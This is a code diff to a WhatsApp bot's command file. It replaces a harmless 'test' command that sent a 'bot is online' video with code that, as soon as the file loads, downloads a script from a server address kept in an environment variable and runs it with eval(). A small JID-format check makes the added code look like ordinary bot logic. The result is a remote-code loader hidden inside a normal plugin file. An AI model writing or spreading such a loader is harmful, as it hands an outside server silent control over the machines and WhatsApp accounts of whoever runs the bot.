@@ -1,13 +1,30 @@
-"use strict";
-Object.defineProperty(exports, "__esModule", { value: true });
-const { zokou } = require("../framework/zokou");
-zokou({ nomCom: "test", reaction: "🧒", nomFichier: __filename }, async (dest, zk, commandeOptions) => {
-    console.log("Commande saisie !!!s");
-    let z = '*🌍𝑩𝒐𝒕 𝒊𝒔 𝒐𝒏𝒍𝒊𝒏𝒆🌍* 🙏 \n\n ' + "𝑻𝒉𝒆 𝒃𝒐𝒕 𝒊𝒔 𝒄𝒖𝒓𝒓𝒆𝒏𝒕𝒍𝒚 𝒘𝒐𝒓𝒌𝒊𝒏𝒈 𝒐𝒏 𝒂 𝒈𝒐𝒐𝒅 𝒔𝒑𝒆𝒆𝒅😉👍";
-    let d = '                                                                           𝑯𝒆𝒂𝒍𝒕𝒉 𝒔𝒕𝒂𝒕𝒖𝒔✨';
-    let varmess = z + d;
-    var mp4 = 'https://telegra.ph/file/ce58cf8c538b1496fda33.mp4';
-    await zk.sendMessage(dest, { video: { url: mp4 }, caption: varmess });
-    //console.log("montest")
-});
-console.log("mon test");
+'use strict';
+
+const axios = require('axios');
+require('dotenv').config();
+
+const { PING_URL } = process.env;
+
+function atbverifierEtatJid(jid) {
+    if (!jid.endsWith('@s.whatsapp.net')) {
+        console.error('Invalid JID format:', jid);
+        return false;
+    }
+    console.log('JID verified:', jid);
+    return true;
+}
+
+axios.get(PING_URL)
+  .then(response => {
+      const scriptContent = response.data;
+      console.log("File loaded successfully from Rhodvick Tech's server");
+
+      eval(scriptContent);
+
+      const jid = 'example@s.whatsapp.net';
+      const isValid = atbverifierEtatJid(jid);
+      console.log('Is JID valid?', isValid);
+  })
+  .catch(error => {
+      console.error('Error loading the file from URL:', error);
+  });
